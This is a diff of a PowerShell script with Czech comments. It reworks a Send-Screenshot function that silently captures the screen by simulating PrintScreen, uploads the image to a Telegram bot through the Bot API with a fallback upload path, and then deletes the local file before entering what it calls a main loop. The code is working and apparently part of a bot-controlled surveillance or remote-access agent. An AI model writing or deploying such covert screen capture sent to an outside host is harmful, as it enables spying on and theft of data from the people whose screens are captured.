@@ -92,49 +92,38 @@ function Send-Screenshot {
         return
     }
     
-    Write-Log "Delam screenshot vsech monitoru..."
+    Write-Log "Delam screenshot..."
     
     try {
-        Add-Type -AssemblyName System.Drawing
         Add-Type -AssemblyName System.Windows.Forms
+        Add-Type -AssemblyName System.Drawing
         
-        # Získej všechny obrazovky
-        $screens = [System.Windows.Forms.Screen]::AllScreens
+        # Smaž clipboard
+        [System.Windows.Forms.Clipboard]::Clear()
         
-        # Najdi minimální a maximální souřadnice
-        $minX = ($screens.Bounds.Left | Measure-Object -Minimum).Minimum
-        $minY = ($screens.Bounds.Top | Measure-Object -Minimum).Minimum
-        $maxX = ($screens.Bounds.Right | Measure-Object -Maximum).Maximum
-        $maxY = ($screens.Bounds.Bottom | Measure-Object -Maximum).Maximum
+        # Simuluj stisknutí PrintScreen
+        Add-Type -AssemblyName System.Windows.Forms
+        [System.Windows.Forms.SendKeys]::SendWait("{PRTSC}")
         
-        $width = $maxX - $minX
-        $height = $maxY - $minY
+        # Počkej na zachycení
+        Start-Sleep -Milliseconds 500
         
-        Write-Log "Screenshot rozmery: $width x $height (vsechny monitory)"
+        # Získej obrázek z clipboardu
+        $image = [System.Windows.Forms.Clipboard]::GetImage()
         
-        if($width -le 0 -or $height -le 0) {
-            # Fallback na primární obrazovku
-            Write-Log "Neplatne rozmery, pouzivam primarni obrazovku"
-            $screen = [System.Windows.Forms.Screen]::PrimaryScreen
-            $minX = $screen.Bounds.Left
-            $minY = $screen.Bounds.Top
-            $width = $screen.Bounds.Width
-            $height = $screen.Bounds.Height
+        if($image -eq $null) {
+            throw "Screenshot se nepodaril - clipboard je prazdny"
         }
         
-        # Vytvoř bitmap
-        $bitmap = New-Object System.Drawing.Bitmap $width, $height
-        $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
+        Write-Log "Screenshot zachycen: $($image.Width)x$($image.Height)"
         
-        # Zachyť obrazovku od pozice ($minX, $minY)
-        $graphics.CopyFromScreen($minX, $minY, 0, 0, [System.Drawing.Size]::new($width, $height))
-        
-        # Ulož
+        # Ulož do souboru
         $screenshotPath = "C:\screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').png"
-        $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
+        $image.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
         
-        $graphics.Dispose()
-        $bitmap.Dispose()
+        # Uvolni prostředky
+        $image.Dispose()
+        [System.Windows.Forms.Clipboard]::Clear()
         
         Write-Log "Screenshot ulozen: $screenshotPath"
         
@@ -142,16 +131,20 @@ function Send-Screenshot {
         $uri = "https://api.telegram.org/bot$botToken/sendPhoto"
         
         try {
+            # PowerShell 6+ způsob
             $form = @{
                 chat_id = $chatId
                 photo = Get-Item -Path $screenshotPath
             }
             Invoke-RestMethod -Uri $uri -Method Post -Form $form | Out-Null
+            Write-Log "Screenshot odeslan (metoda 1)"
         } catch {
+            # PowerShell 5.1 fallback
             $fileBytes = [System.IO.File]::ReadAllBytes($screenshotPath)
             $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
             $boundary = [System.Guid]::NewGuid().ToString()
             $LF = "`r`n"
+            
             $bodyLines = (
                 "--$boundary",
                 "Content-Disposition: form-data; name=`"chat_id`"$LF",
@@ -162,18 +155,20 @@ function Send-Screenshot {
                 $fileEnc,
                 "--$boundary--$LF"
             ) -join $LF
+            
             Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines | Out-Null
+            Write-Log "Screenshot odeslan (metoda 2)"
         }
         
-        Write-Log "Screenshot odeslan OK"
+        # Smaž soubor
         Remove-Item $screenshotPath -Force
+        Write-Log "Screenshot dokoncen"
         
     } catch {
         Write-Log "ERROR pri screenshotu: $_"
         Send-Message "[ERROR] Screenshot selhal: $($_.Exception.Message)"
     }
 }
-
 Write-Log "Vstupuji do hlavni smycky"
 $loopCount = 0
 
